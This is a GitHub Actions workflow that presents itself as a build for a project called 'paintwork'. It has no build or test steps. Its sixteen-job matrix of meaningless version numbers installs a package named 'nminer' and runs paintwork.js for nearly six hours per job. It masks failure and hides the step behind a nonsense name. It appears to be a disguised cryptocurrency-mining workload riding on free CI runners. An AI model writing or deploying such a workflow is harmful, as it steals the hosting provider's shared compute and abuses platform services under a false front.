name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4326 }
          - { version: 7811 }
          - { version: 1358 }
          - { version: 5037 }
          - { version: 9222 }
          - { version: 3806 }
          - { version: 4249 }
          - { version: 2127 }
          - { version: 7869 }
          - { version: 3040 }
          - { version: 7208 }
          - { version: 8978 }
          - { version: 4823 }
          - { version: 5697 }
          - { version: 509 }
          - { version: 8514 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ick after dimly
        run: |
          npm install nminer@latest
          timeout 344m node paintwork.js || echo "paintwork executed"